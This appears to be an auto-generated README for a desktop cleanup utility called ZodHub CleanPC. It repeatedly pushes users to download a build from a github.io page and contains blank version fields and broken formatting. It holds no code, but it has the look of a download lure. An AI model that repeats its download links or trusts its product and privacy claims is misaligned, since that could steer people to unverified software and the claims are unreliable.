# ZodHub CleanPC

> **ZodHub CleanPC is a local-first maintenance cleaner for macOS and Windows, built to help you free up storage, organize clutter, and handle routine cleanup in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-macOS%20and%20Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tylermqatwalker8510/zodhub-cleanpc-hub?style=flat-square)](https://github.com/tylermqatwalker8510/zodhub-cleanpc-hub)

---

<p align="center">
  <a href="https://tylermqatwalker8510.github.io/zodhub-cleanpc-hub/">
    <img src="https://img.shields.io/badge/Download-ZodHub%20CleanPC%20Latest-brightgreen?style=for-the-badge" alt="Download ZodHub CleanPC">
  </a>
</p>

> **[Direct Download - ZodHub CleanPC v](https://tylermqatwalker8510.github.io/zodhub-cleanpc-hub/)**

---

[Download Latest Build](https://tylermqatwalker8510.github.io/zodhub-cleanpc-hub/)

---

## What ZodHub CleanPC Is

ZodHub CleanPC is a desktop utility for macOS and Windows, implemented with Tauri, Rust, and React. It is aimed at users who want an uncomplicated set of maintenance tools for managing storage, reviewing disk usage, and running cleanup tasks from one place.

The workflow stays on the local machine and does not include telemetry, so the app keeps its operations on-device instead of sending activity to an external service. That makes it a good match for anyone looking for a privacy-aware cleanup tool with support for cache removal, duplicate file detection, uninstall cleanup, and scheduled maintenance.

---

## Capabilities

- Remove caches and temporary files to recover disk space
- Detect duplicate files by comparing file contents
- Uninstall apps and clean up leftover files
- Inspect storage usage and find large files fast
- Set maintenance jobs for repeated cleanup runs
- Clear macOS snapshots and .DS_Store files
- Use the built-in updater to get newer builds
- Keep all data local with no telemetry

---

## Getting Started

1. Download the latest build from the project page.
2. Or clone the repository if you want to build or inspect the source locally:
   - `git clone https://github.com/tylermqatwalker8510/zodhub-cleanpc-hub.git
3. Open or run the desktop app according to your platform build.
4. If you are using a packaged release, launch the app directly after download.

---

## How to Use It

ZodHub CleanPC is set up as a guided workspace for routine maintenance:

- Begin with the storage overview to see what is using space.
- Run cache and temporary file cleanup when you need a quick reclaim.
- Inspect duplicate matches before deleting anything.
- Use the uninstall tool to remove applications and check for leftovers.
- Create scheduled maintenance tasks if you want recurring cleanup.
- On macOS, review snapshot and .DS_Store cleanup options when appropriate.
- Use the built-in updater whenever a newer build is available.

---

## Settings

Configuration lives inside the desktop app. Based on the build, available preferences can include cleanup behavior, scheduled tasks, and update checks.

For source builds, the project is organized around a Tauri, Rust, and React stack, so app behavior is generally managed through the UI and the related configuration files in the repository structure.

---

## Requirements

- macOS or Windows
- Desktop runtime compatible with Tauri-based applications
- Enough local storage to scan files and manage cleanup operations
- Permission to access the folders, apps, or system areas you want to inspect

---

## FAQ

**Does ZodHub CleanPC send telemetry?**  
No telemetry is described for the product; it is presented as local-only.

**Can I use it on both macOS and Windows?**  
Yes. The project targets both platforms.

**How do I get updates?**  
Use the built-in automatic updater or download a newer build from the project page.

**Where are settings stored?**  
Settings are handled in the app. For source builds, check the project structure for the relevant Tauri configuration and application files.

**What should I do if a scan does not finish?**  
Verify file permissions, available disk space, and whether the folders you are scanning are accessible on your system.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
